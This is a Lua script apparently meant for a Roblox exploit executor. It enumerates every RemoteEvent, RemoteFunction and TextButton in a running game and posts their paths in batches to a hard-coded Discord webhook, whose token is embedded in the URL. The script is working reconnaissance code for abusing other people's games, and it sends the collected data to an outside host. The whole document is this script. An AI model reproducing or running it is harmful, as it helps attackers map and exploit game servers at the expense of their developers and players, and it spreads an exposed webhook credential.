-- dc_dump.lua
local WEBHOOK = "https://discord.com/api/webhooks/1573296342854410384/3Nfz9qxVONkZl1jZADGMzCN6buVXkKydQgc8vNwIHjwhDvYsffo4BWcoe3UU1fI86CNf"
local http = request or http_request or (syn and syn.request) or (http and http.request)
local HttpService = game:GetService("HttpService")

local function post(content)
    if not http then return end
    pcall(function()
        http({
            Url = WEBHOOK,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({ content = content })
        })
    end)
end

if not http then
    return
end

local lines = {}
local n = 0
for _, d in ipairs(game:GetDescendants()) do
    if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") or d:IsA("TextButton") then
        n = n + 1
        table.insert(lines, d.ClassName .. " :: " .. d:GetFullName())
    end
end

local buf = ""
for _, line in ipairs(lines) do
    if #buf + #line + 1 > 1900 then
        post(buf)
        buf = ""
        task.wait(1)
    end
    buf = buf .. line .. "\n"
end
if #buf > 0 then post(buf) end
post("TOTAL: " .. n)
